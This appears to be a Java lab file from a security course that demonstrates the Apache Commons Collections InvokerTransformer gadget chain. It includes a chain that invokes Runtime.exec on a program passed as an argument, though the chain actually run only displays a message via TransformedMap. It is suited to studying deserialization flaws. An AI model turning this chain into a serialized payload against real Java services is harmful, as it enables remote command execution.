@@ -1,0 +1,62 @@
+package fr.tp.cyber701.hack;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class TransformerDemo {
+
+	public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
+        //HackMessagePane.class.getDeclaredMethod("displayMessage").invoke(null);
+        final String cmd = "c:/windows/explorer.exe";
+        
+        final Transformer[] hackingTransformers = new Transformer[] {
+    			new ConstantTransformer( Runtime.class ),
+    			new InvokerTransformer( "getMethod",
+    									new Class<?>[] { String.class, Class[].class },
+    									new Object[] {"getRuntime", new Class[0] } ),
+    			new InvokerTransformer( "invoke",
+    									new Class<?>[] { Object.class, Object[].class },
+    									new Object[] { null, new Object[0] } ),
+    			
+    			// Invoke the "exec" method on the Java runtime object to execute a program whose executable file
+    			// is specified as args[ 0 ].
+    			new InvokerTransformer( "exec",
+    									new Class<?>[] { String.class },
+    									new Object[] { args[ 0 ] } ),
+    			
+    		};
+        
+		final Transformer[] hackTransformers = new Transformer[] {
+				ConstantTransformer.getInstance(HackMessagePane.class),
+				
+				new InvokerTransformer( "getMethod", 
+						new Class[]{ String.class, Class[].class },
+                        new Object[]{ "displayMessage", new Class[0] } ),
+				
+				/*new InvokerTransformer( "displayMessage",
+										new Class<?>[] { },
+										new Object[] { } ),*/
+				
+				new InvokerTransformer( "invoke",
+										new Class<?>[] { Object.class },
+										new Object[] { null } ),
+				
+			};
+		
+		ChainedTransformer chain = new ChainedTransformer( hackTransformers );
+
+        Map m = new HashMap();
+        m.put( "1", "1" );
+        Map map = TransformedMap.decorate(m, null, chain );
+        map.put( "a", "b" );
+	}
+
+}
